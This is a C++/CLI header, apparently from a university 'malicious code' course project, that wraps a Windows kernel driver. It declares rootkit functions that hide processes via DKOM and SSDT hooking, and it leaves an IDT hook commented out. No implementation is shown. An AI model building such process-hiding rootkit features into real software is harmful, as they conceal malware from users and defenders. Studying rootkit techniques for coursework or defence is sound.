// Wrapper.h

//#pragma once
//
//using namespace System;

#pragma once

#include <windows.h>
#include <vcclr.h>
#include <string>
#include "Driver.hpp"

using namespace System;

#pragma comment (lib, "F:\\Epitech\\M2.malicious code\\Deadlands\\programs\\Windows\\prgm\\gui\\Debug\\Driver.lib")

namespace conversion
{
	static std::string convertStringToStlString (String ^ chaine)
	{
		char * chaineChar;
		pin_ptr<const wchar_t> wch = PtrToStringChars(chaine);
		int taille = (chaine->Length+1) * 2;
		chaineChar = new char[taille];
		int t = WideCharToMultiByte(CP_ACP, 0, wch, taille, NULL, 0, NULL, NULL);
		WideCharToMultiByte(CP_ACP, 0, wch, taille, chaineChar, t, NULL, NULL);
		std::string chaineSTL = chaineChar;
		delete chaineChar;
		return chaineSTL;
	}
}

namespace wrapper
{
	public ref class CliWrapperDriver
	{
	public:
		/*
		** ~ Constructor / Destructor:
		*/
		CliWrapperDriver(String^ filename, String^ displayName, String^ deviceName);
		~CliWrapperDriver();

		/*
		** ~ Main methods:
		*/
		//int	LoadDriver();
		//int	UnloadDriver();

		/*
		** ~ Hide processes:
		*/
		int	DKOMHideProcess(String^ pid);
		int	SSDTHideProcess(String^ name);

		/*
		** ~ Hook methods:
		*/
		//int	HookIDT(String^ nInt);

	private:
		/*
		** ~ Attributes:
		*/
		CDriver*	_driver;
	};
}
